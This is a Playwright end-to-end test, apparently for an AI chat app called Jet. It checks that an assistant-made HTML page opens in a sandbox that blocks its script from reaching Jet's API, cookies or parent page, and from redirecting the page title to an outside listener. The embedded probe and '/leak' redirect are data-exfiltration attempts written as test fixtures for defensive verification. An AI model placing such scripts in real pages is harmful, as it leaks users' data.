// Drives artifacts in the real page: Jet describes an uploaded file, writes an HTML page and shares it to the main chat through
// the provider stand-in; then the thread's file card, the sandboxed file view, the plan pane's Files list and the page at 390 px
// are checked, and the page's own script proves from inside the frame that it can reach nothing of Jet's.
// It takes the screenshots.
import assert from 'node:assert/strict';
import http from 'node:http';
import { mkdtemp, mkdir, writeFile, chmod, readFile, rm } from 'node:fs/promises';
import { setTimeout as delay } from 'node:timers/promises';
import path from 'node:path';
import os from 'node:os';
import { fileURLToPath } from 'node:url';
import { createProcesses, saveOwnerSettings, signIn, until } from './process.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../../..');
const scratch = await mkdtemp(path.join(os.tmpdir(), 'jet-artifacts-'));
const screens = process.env.SCREENSHOT_DIR ?? path.join(scratch, 'screens');
await mkdir(screens, { recursive: true });
const processes = createProcesses();
const OWNER = 'shaunsurfing@gmail.com';
const NOTE = 'Planning notes for the kite budget.';
const PAGE_NOTE = 'One-page summary of the kite budget.';
const PROBE = `(async () => {
  const t = async (f) => { try { return await f(); } catch (e) { return 'refused: ' + e.name; } };
  const api = await t(async () => (await fetch('/api/pane', { credentials: 'include' })).status);
  const cookie = await t(() => document.cookie || '');
  const parentTitle = await t(() => parent.document.title);
  document.getElementById('probe').textContent = JSON.stringify({ ran: true, origin: self.origin, api, cookie, parent: parentTitle });
})();`;
const html = (leak) => `<!doctype html>
<html><head><meta charset="utf-8"><title>Kite budget summary</title>
<style>
body { margin: 0; padding: 28px 24px; font: 16px/1.5 system-ui, sans-serif; color: #1b2733; }
h1 { margin: 0 0 8px; font-size: 26px; } p { margin: 0 0 16px; color: #52606d; }
table { width: 100%; border-collapse: collapse; } th, td { padding: 8px 10px; border-bottom: 1px solid #d9e0e6; text-align: left; } th { background: #eef2f5; }
#probe { margin-top: 28px; font: 11px/1.4 ui-monospace, monospace; color: #7b8794; word-break: break-all; }
</style></head>
<body><h1>Kite budget summary</h1><p>What the kite will cost, in three lines.</p>
<table><tr><th>Item</th><th>Cost</th></tr><tr><td>Ripstop cloth</td><td>$24</td></tr><tr><td>Spars and string</td><td>$18</td></tr><tr><td>Reel</td><td>$9</td></tr></table>
<p><a id="out" href="${leak}/click">Read more on another site</a></p>
<p id="probe"></p><script>${PROBE}</script>
<script>setTimeout(() => { location = '${leak}/leak?' + encodeURIComponent(document.title); }, 2500);</script></body></html>`;

// A listener that records every request: nothing may ever reach it, because a page must not be able to send itself away.
const hits = [];
const listener = http.createServer((request, response) => { hits.push(request.url); response.end('you left Jet'); });
await new Promise((resolve) => listener.listen(0, '127.0.0.1', resolve));
const leak = `http://127.0.0.1:${listener.address().port}`;
let browser, page;
try {
  const data = path.join(scratch, 'data');
  await mkdir(data);
  const provider = path.join(scratch, 'provider.cjs');
  await writeFile(provider, '#!' + process.execPath + '\n' + `
const fs = require('node:fs');
const { spawn } = require('node:child_process');
const input = fs.readFileSync(0, 'utf8');
if (/^facade:/m.test(input)) {
  const child = spawn(${JSON.stringify(path.join(root, 'target/debug/fake-claude'))}, process.argv.slice(2), { stdio: ['pipe', 'inherit', 'inherit'] });
  child.stdin.end(input); child.on('exit', code => process.exit(code || 0));
} else {
  const text = 'Got it.';
  for (const event of [
    { type: 'system', subtype: 'init', session_id: 'artifacts-fixture', model: 'claude-fake' },
    { type: 'stream_event', event: { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } } },
    { type: 'result', subtype: 'success', is_error: false, result: text, session_id: 'artifacts-fixture', duration_ms: 10, duration_api_ms: 10, num_turns: 1, total_cost_usd: 0, usage: {} },
  ]) console.log(JSON.stringify(event));
}
`);
  await chmod(provider, 0o755);
  const origin = await processes.launch(process.env.JET_BINARY ?? path.join(root, 'target/debug/jet'), ['--listen', '127.0.0.1:0', '--data-dir', data, '--ui-dir', path.join(root, 'crates/jet/ui'), '--disable-feelings', '--disable-voice'], /Jet listening on (http:\/\/\S+)/);
  await saveOwnerSettings(origin, { model: 'sonnet', claudePath: provider, reducedMotion: true });

  // ---- Seed, through the real routes, as the owner.
  const signedIn = await fetch(origin + '/api/auth/signin', { method: 'POST', headers: { origin, 'content-type': 'application/json' }, body: JSON.stringify({ email: OWNER, password: '000111' }) });
  const cookie = signedIn.headers.getSetCookie().map((line) => line.split(';')[0]).join('; ');
  const call = async (method, route, body, type = 'application/json') => {
    const response = await fetch(origin + route, { method, headers: { origin, cookie, 'content-type': type }, body: body === undefined ? undefined : type === 'application/json' ? JSON.stringify(body) : body });
    const text = await response.text();
    assert.ok(response.ok, `${method} ${route}: ${text}`);
    return text ? JSON.parse(text) : null;
  };
  const turn = async (chat, words, script, attachments = []) => {
    await rm(path.join(data, 'facade-results.json'), { force: true });
    await call('POST', `/api/chat/send?chat=${chat}`, { requestId: 'r' + Math.random().toString(16).slice(2), clientId: 'seed', text: `${words}\nfacade:${JSON.stringify(script)}`, attachments, model: 'sonnet', effort: 'medium', budgetUsd: 1, persona: { name: 'Jet', jobTitle: 'First mate', notes: '' }, localTime: 'Friday', timeZone: 'Europe/London', feeling: 'neutral' });
    await until(async () => { try { return JSON.parse(await readFile(path.join(data, 'facade-results.json'), 'utf8')).length === script.length; } catch { return false; } }, 'the scripted turn must finish: ' + words);
    for (const result of JSON.parse(await readFile(path.join(data, 'facade-results.json'), 'utf8'))) assert.equal(result.isError, false, JSON.stringify(result));
    await delay(300);
  };
  const files = (command) => ({ tool: 'files_update', arguments: { command } });
  const mainChat = (await call('GET', '/api/chats'))[0].id;
  await turn(mainChat, 'I am planning a kite budget.', [{ tool: 'objectives_update', arguments: { command: { action: 'create', title: 'Kite budget', deliverable: 'A budget the kite fits inside', start: '2099-06-01', due: '2099-07-01', steps: [], sources: [{ kind: 'jet' }], check: { at: '2099-06-08T09:00', why: 'see whether the budget is settled' } } } }]);
  const chat = (await call('GET', '/api/pane')).objectives[0].chatId;
  const upload = await call('POST', '/api/files?name=kite-budget.txt', 'Kite budget\ncloth 24\nspars 18\nreel 9\n', 'text/plain');
  await turn(chat, 'Here is my budget.', [files({ action: 'describe', id: upload.id, context: NOTE }), files({ action: 'create', name: 'kite-summary.html', content: html(leak), context: PAGE_NOTE })], [upload.id]);
  const made = (await call('GET', '/api/files')).files.find((file) => file.name === 'kite-summary.html');
  assert.ok(made, 'Jet made the page');
  await turn(chat, 'Share the summary with the main chat.', [files({ action: 'share', id: made.id, chat: mainChat })]);

  // ---- The browser.
  const { chromium } = await import(process.env.PLAYWRIGHT_MODULE ?? 'playwright');
  browser = await chromium.launch({ executablePath: process.env.CHROME_BINARY, headless: true });
  const errors = [];

  async function exercise(name, viewport, phone) {
    const context = await browser.newContext({ viewport, reducedMotion: 'reduce', ...(phone ? { hasTouch: true, isMobile: true } : {}) });
    context.setDefaultTimeout(15000);
    const served = [];
    context.on('response', (response) => { if (/^\/api\/files\/[^/]+\/(view|frame)$/.test(new URL(response.url()).pathname)) served.push(response); });
    page = await context.newPage();
    page.on('pageerror', (error) => errors.push(String(error)));
    await signIn(page, origin);
    await page.locator('#loading').waitFor({ state: 'detached' });
    const shoot = async (file) => { await delay(400); await page.screenshot({ path: path.join(screens, `${name}-${file}.png`), animations: 'disabled' }); };
    const fits = async (note) => assert.ok(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), `${note}: the page is wider than the window`);
    const toChat = async (title) => {
      if (phone && (await page.locator('.workspace-shell').getAttribute('data-expanded')) !== 'true') await page.locator('.chats-toggle').click();
      await page.locator('.chat-row', { hasText: title }).first().click();
      await until(async () => (await page.locator('.chat-head').innerText()).includes(title), `the chat ${title} opens`);
    };
    const showPane = async () => { if (phone && (await page.locator('#side-pane').isHidden())) { await page.locator('.pane-toggle').tap(); await page.locator('#side-pane').waitFor({ state: 'visible' }); } };
    const dialog = page.locator('dialog.file-view[open]');
    const outer = page.frameLocator('dialog.file-view iframe');
    const inner = outer.frameLocator('iframe');
    const probeOf = async () => JSON.parse(await inner.locator('#probe').filter({ hasText: 'ran' }).innerText());
    const stayed = async (note) => { await delay(3000); assert.deepEqual(hits, [], `${note}: the page sent itself to another site`); };

    // 1. The thread: the page is a file card; the note and the share are one line each.
    await toChat('Kite budget');
    const card = page.locator('.card-file', { hasText: 'kite-summary.html' });
    await card.waitFor();
    assert.equal(await card.getByRole('link', { name: 'Open kite-summary.html' }).count(), 1, 'the file card has Open');
    assert.equal(await card.getByRole('link', { name: 'Download kite-summary.html' }).count(), 1, 'the file card has Download');
    const thread = await page.locator('#rows').innerText();
    assert.match(thread, /Noted what kite-budget\.txt is/, 'the note is a line in the thread');
    assert.match(thread, /Shared kite-summary\.html with /, 'the share is a line in the thread');
    await fits(`${name} thread`);
    await shoot('1-file-card');

    // 2. Open: a sandboxed frame; the page's script ran and could reach nothing.
    const open = card.getByRole('link', { name: 'Open kite-summary.html' });
    await open.click();
    await dialog.waitFor();
    assert.equal(await dialog.locator('iframe').getAttribute('sandbox'), null, 'the outer frame holds Jet\'s wrapper, not the file');
    assert.equal(await outer.locator('iframe').getAttribute('sandbox'), 'allow-scripts', 'the file\'s frame has only allow-scripts');
    await inner.getByRole('heading', { name: 'Kite budget summary' }).waitFor();
    const probe = await probeOf();
    console.log(`${name} probe in the frame: ${JSON.stringify(probe)}`);
    assert.equal(probe.ran, true, 'the page script ran');
    assert.equal(probe.origin, 'null', 'the frame has no origin of its own');
    assert.notEqual(probe.api, 200, 'the page could read Jet\'s API');
    assert.match(String(probe.api), /^refused/, 'the API call is refused');
    assert.ok(probe.cookie === '' || String(probe.cookie).startsWith('refused'), 'the page could read a cookie');
    assert.match(String(probe.parent), /^refused/, 'the page could read Jet\'s page');
    const policyOf = (kind) => served.findLast((response) => response.status() === 200 && response.url().endsWith('/' + kind)).headers()['content-security-policy'];
    assert.match(policyOf('view'), /sandbox/, 'the file is served with a sandbox policy');
    assert.doesNotMatch(policyOf('view'), /allow-same-origin/, 'the policy does not give the page an origin');
    assert.match(policyOf('frame'), /frame-src 'self'/, 'the wrapper keeps the file from leaving');
    assert.equal(await page.locator('#probe').count(), 0, 'nothing of the page is in Jet\'s own DOM');
    const box = await dialog.boundingBox();
    if (phone) {
      assert.deepEqual([box.width, box.height], [viewport.width, viewport.height], 'the file view fills the phone');
      for (const control of await dialog.locator('.file-view-download, .file-view-tab, .file-view-close').all()) assert.ok((await control.boundingBox()).height >= 44, 'a control in the file view is under 44 px');
    }
    await fits(`${name} file view`);
    await shoot('2-file-view');
    // The page tries to leave 2.5 s after it loads (and, at 1440, a click on its link tries at once): the listener must hear nothing.
    if (!phone) await inner.locator('#out').click();
    await stayed(`${name} file view`);
    if (!phone) { await page.screenshot({ path: path.join(scratch, 'after-leave.png') }); console.log('after the attempts: ' + path.join(scratch, 'after-leave.png')); }
    // A click in the file's frame gives that frame the keys, so the focus comes back to the dialog before Escape.
    await dialog.locator('.file-view-close').focus();
    await page.keyboard.press('Escape');
    await dialog.waitFor({ state: 'detached' });
    assert.equal(await page.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Open kite-summary.html', 'the focus is back on Open');
    await until(async () => (await page.locator('dialog.file-view iframe').count()) === 0, 'closing removes the frame');

    // 3. The pane lists the chat's files; a tap on the page's row opens it.
    await showPane();
    const rows = page.locator('#side-pane .file-row');
    await rows.first().waitFor();
    assert.equal(await rows.count(), 2, 'the pane lists both files');
    assert.match(await page.locator('#side-pane .pane-heading', { hasText: 'Files' }).innerText(), /Files\s*2/, 'the heading counts them');
    const pageRow = rows.filter({ hasText: 'kite-summary.html' });
    const textRow = rows.filter({ hasText: 'kite-budget.txt' });
    // A row skips drawing its contents until the browser has placed it on screen (content-visibility: auto), and its
    // innerText is empty until then, so the rows are read by their text in the page, which is there at once.
    assert.match(await pageRow.textContent(), /HTML page · \d+ KB · .*(ago|just now) · Kite budget and 1 more/, 'the page row has kind, size, when and its chats');
    assert.match(await textRow.textContent(), /Text · \d+ B · .* · Kite budget$/, 'the text row has kind, size, when and its one chat');
    assert.doesNotMatch(await textRow.textContent(), new RegExp(NOTE), 'the note is in the dialog, not the row');
    if (phone) for (const row of await rows.all()) assert.ok((await row.locator('.file-row-open').boundingBox()).height >= 44, 'a file row is under 44 px');
    await fits(`${name} pane`);
    await shoot('3-pane-files');
    if (!phone) {
      await textRow.locator('.file-row-open').click();
      await dialog.locator('.file-view-note', { hasText: NOTE }).waitFor();
      await page.keyboard.press('Escape');
      await dialog.waitFor({ state: 'detached' });
      await pageRow.locator('.file-row-open').click();
      await dialog.waitFor();
      await inner.getByRole('heading', { name: 'Kite budget summary' }).waitFor();
      await page.keyboard.press('Escape');
      await dialog.waitFor({ state: 'detached' });
      await toChat('Main chat');
      await until(async () => (await rows.count()) === 1, 'the main chat lists only the shared page');
      assert.match(await rows.first().textContent(), /kite-summary\.html/);

      // 4. The page opened as a tab of its own is sandboxed too.
      const tab = await context.newPage();
      await tab.goto(`${origin}/api/files/${made.id}/view`);
      assert.ok(tab.url().endsWith(`/api/files/${made.id}/frame`), 'a page opened as a tab ends on its wrapper');
      const alone = JSON.parse(await tab.frameLocator('iframe').locator('#probe').filter({ hasText: 'ran' }).innerText());
      console.log(`${name} probe in a tab: ${JSON.stringify(alone)}`);
      assert.equal(alone.origin, 'null', 'the tab has no origin of its own');
      assert.match(String(alone.api), /^refused/, 'the tab could read Jet\'s API');
      assert.match(String(alone.parent), /^refused/, 'the tab\'s page could read its wrapper');
      await delay(3000);
      assert.deepEqual(hits, [], 'the tab: the page sent itself to another site');
      await tab.close();
    }
    await context.close();
  }

  await exercise('1440', { width: 1440, height: 900 }, false);
  await exercise('390', { width: 390, height: 844 }, true);
  assert.deepEqual(errors, []);
  console.log(`The listener received: ${JSON.stringify(hits)}`);
  console.log('PASS artifacts_are_cards_a_sandboxed_view_and_pane_files_and_fit');
  console.log('Screenshots: ' + screens);
} catch (error) {
  if (page) { await page.screenshot({ path: path.join(screens, 'failure.png') }).catch(() => {}); console.error(await page.locator('body').innerText().catch(() => '')); }
  throw error;
} finally {
  await browser?.close();
  listener.close();
  await processes.close();
  if (!process.env.SCREENSHOT_DIR) await rm(scratch, { recursive: true, force: true });
}
